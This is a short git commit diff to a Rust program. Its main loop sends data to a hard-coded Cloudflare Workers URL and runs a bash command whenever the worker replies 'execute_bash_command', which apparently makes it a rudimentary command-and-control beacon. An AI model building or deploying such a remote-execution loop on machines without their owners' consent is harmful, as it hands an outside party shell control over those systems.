34c262ab535d78c3a2f44c2dc5a8dfc55d381a0d
AlphaRora <adoba@alpharora.com>
2024-04-09 22:11:53 -0400

    Commit

--- src/main.rs
+++ src/main.rs
@@ -6,8 +6,11 @@ async fn main() {
     let worker_url = "https://serverworker.adoba.workers.dev/";
 
     loop {
-        let command = worker_communication::send_command_request(&worker_url).await;
-        if command == "execute_bash_command" {
+        // Send data to the Worker
+        let response = worker_communication::send_data_request(&worker_url, "Sample data").await;
+
+        // Check the response from the Worker
+        if response == "execute_bash_command" {
             command_executor::execute_bash_command();
         }
         // Add more conditions or logic to handle different commands
